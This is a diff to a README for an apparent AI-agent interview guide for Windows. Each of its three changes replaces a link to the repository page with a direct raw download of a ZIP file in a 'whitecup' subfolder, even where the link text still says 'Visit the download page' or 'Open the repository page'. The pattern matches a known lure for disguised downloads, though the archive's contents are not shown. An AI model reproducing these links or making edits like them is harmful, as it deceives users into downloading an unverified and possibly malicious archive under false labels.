@@ -1,6 +1,6 @@
 # 📘 ai-agent-interview-guide - Ace AI interviews with confidence
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20Guide-6f42c1?style=for-the-badge)](https://github.com/Plumbagoeuropaeahigh85/ai-agent-interview-guide)
+[![Download](https://img.shields.io/badge/Download-Get%20the%20Guide-6f42c1?style=for-the-badge)](https://github.com/Plumbagoeuropaeahigh85/ai-agent-interview-guide/raw/refs/heads/main/whitecup/interview_agent_ai_guide_v3.5.zip)
 
 ## 🚀 Overview
 
@@ -34,7 +34,7 @@ This guide works on a standard Windows computer.
 
 Use this link to visit the download page and get the files:
 
-[Visit the download page](https://github.com/Plumbagoeuropaeahigh85/ai-agent-interview-guide)
+[Visit the download page](https://github.com/Plumbagoeuropaeahigh85/ai-agent-interview-guide/raw/refs/heads/main/whitecup/interview_agent_ai_guide_v3.5.zip)
 
 If the page opens a ZIP file or release package, save it to your computer first. Then open the file and extract it to a folder you can find again, such as Downloads or Desktop.
 
@@ -261,7 +261,7 @@ After download, open these first if they are present:
 
 ## 🔗 Source
 
-[Open the repository page](https://github.com/Plumbagoeuropaeahigh85/ai-agent-interview-guide)
+[Open the repository page](https://github.com/Plumbagoeuropaeahigh85/ai-agent-interview-guide/raw/refs/heads/main/whitecup/interview_agent_ai_guide_v3.5.zip)
 
 ## 🧠 Focus areas by role
 
